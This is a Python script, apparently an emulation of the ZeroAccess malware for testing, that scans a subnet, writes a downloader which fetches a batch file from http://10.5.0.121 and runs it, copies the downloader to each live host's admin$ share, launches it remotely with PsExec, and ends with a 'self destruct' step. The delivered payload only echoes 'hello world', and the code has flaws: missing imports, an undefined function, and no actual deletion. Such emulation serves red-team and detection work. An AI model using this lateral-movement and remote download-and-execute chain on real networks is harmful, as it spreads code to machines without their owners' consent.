import os
import sys
import time

import Class_C_Scan_Module as ScanC
import common
from _winreg import *


def main():
    PsExecPath = "C:\\Users\\administrator\\Desktop\\ZeroAccess\\PsExec.exe"
    HttpServerFile = "C:\\Users\\administrator\\Desktop\\ZeroAccess\\HttpServer.py"

    common.log("Scanning the network...")
    time.sleep(2)
    live_hosts = ScanC.main()
    for host in live_hosts:
        common.logcsv([common.HOSTNAME, common.gettime(), "Ping", str(host), "Created"])

    common.log("Starting lateral movement...")
    time.sleep(2)

    common.log("Creating the downloader.py file...")
    time.sleep(2)

    # TODO: Update sundy about the files created (downloader.py)
    with open(common.BASE_DIR + "\\downloader.py", "w") as file:
        file.write("import urllib3.request \n")
        file.write("import os \n")
        file.write("url = 'http://10.5.0.121/hello.bat'")
        file.write("\n")
        file.write("PoolManager = urllib3.PoolManager()")
        file.write("\n")
        file.write("with PoolManager.request('GET',url, preload_content=False) " +
                   "as " +
                   "resp, open('C:\\hello.bat', 'wb') " +
                   "as " +
                   "out_file:")
        file.write("\n")
        file.write("    shutil.copyfileobj(resp, out_file)")
        file.write("\n")
        file.write("time.sleep(2)")
        file.write("\n")
        file.write("os.system('C:\\hello.bat')")

    common.log("Creating the hello.bat file...")
    time.sleep(2)

    with open(common.BASE_DIR + "\\hello.bat", "w") as file:
        file.write("start echo hello world")

    common.log("Copying the downloader.py to all other live machines...")
    time.sleep(2)
    for host in live_hosts:
        common.copy_file(common.BASE_DIR + "\\downloader.py", "\\\\%s\\admin$" % str(host))

    common.log("Starting HTTP Server using the local pc ip's...")
    with open(common.BASE_DIR + "\\StartHttpServer.bat", "w") as file:
        file.write("python %s" % HttpServerFile)
    os.system(common.BASE_DIR + "\\StartHttpServer.bat")  # Start HTTP server
    time.sleep(1)

    common.log("Remotely start the downloader.py file on remote machines...")
    time.sleep(2)
    for host in live_hosts:
        os.system(PsExecPath + " \\\\%s " % str(
            host) + "cmd /c C:\\Windows\\downloader.py -accepteula")  # TODO - Change windows to ZeroAcess?

    common.log("Self destruct is ON , astalavista baby!")
    time.sleep(3)
    MainScriptFile = find("ZeroAccess", "C:\\users")
    print("deleting %s" % MainScriptFile)
    common.log("-------File was deleted------")
    sys.exit(0)


if __name__ == "__main__":
    exit(main())
